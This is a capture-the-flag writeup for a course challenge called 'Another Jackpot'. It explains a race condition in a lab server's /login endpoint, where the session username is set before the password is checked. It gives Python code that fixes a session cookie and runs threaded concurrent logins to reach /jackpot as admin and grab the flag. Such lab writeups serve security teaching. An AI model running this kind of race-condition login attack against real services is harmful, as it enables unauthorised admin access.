# Challenge `Another Jackpot` writeup

- Vulnerability:
  - _Endpoint has a **race condition** vulnerability_
- Where:
  - _`/login` endpoint_
- Impact:
  - _Allows to **login as admin** without actually being admin by trying to login with 2 users at the same time during the same session_

## Steps to reproduce

Before doing the attack, we analyzed the code given `(server.py)`. The following code was found in the `/login`:

```python
# Setup the session with the current user
    current_session = get_current_session()
    current_session.username = username
    db.session.commit()

    registered_user = User.query.filter_by(
        username=username, password=User.hash_pwd(password)).first()
```

Looking at it, we can see that the session is set with **the current user**. Then, only after being set, the user is queried in the database. This means that if we try to login with **2 users at the same time**, the session will be set with the first user, but the query will be done with the second user. 
**So... we can login as the second user, even though we are the first one!**

Taking this into account, we can now start the attack. First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22652`.

Since the server associates a **session token** with its respective user everytime a session is created, to use the same session we set the field `JTOKEN` in the cookies to a constant value previously generated.

```python
session.cookies.set('JTOKEN', '7b2d0d9db004ed2ae29546511ec7de7295c2bca5cdcb1b4a14c860a1353020157231ab36139a2c40fa8946691092f84052426c168d405429b521add3433c31f6', domain="mustard.stt.rnl.tecnico.ulisboa.pt", path='/')
```

Now we have to send data to the server. We will send to the endpoint `/login` the following data:

```python
dataAdmin = {"username": 'admin', "password":'test'}
dataUser = {"username": 'test', "password":'test'}
```
Previously, a user was created by the name `test` with the password `test`. This user will be used to achieve our objective.

Having the data established, the requests will be now sent to the server repeatedly. The following code was used to do so: 

```python
def admin(): 
    r = session.post(SERVER + "/login",data=dataAdmin)
    r = session.post(SERVER + "/login",data=dataAdmin)
    r = session.get(SERVER + "/jackpot")
    if r.text.find('SSof{') != -1:
        print(r.text)

def user(): 
    r = session.post(SERVER + "/login",data=dataUser)
    r = session.get(SERVER + "/jackpot")
    
while True:
    Thread(target=partial (admin,)).start() 
    user()
```

Note: In the admin function, the login is done twice. This is done so we have a better chance at storing the user as `admin`.

Now, after a few loops, when getting the `/jackpot` response since we will be the admin, we will get the `flag`.

## Script
The script used can be found [here](another_jackpot_poc.py)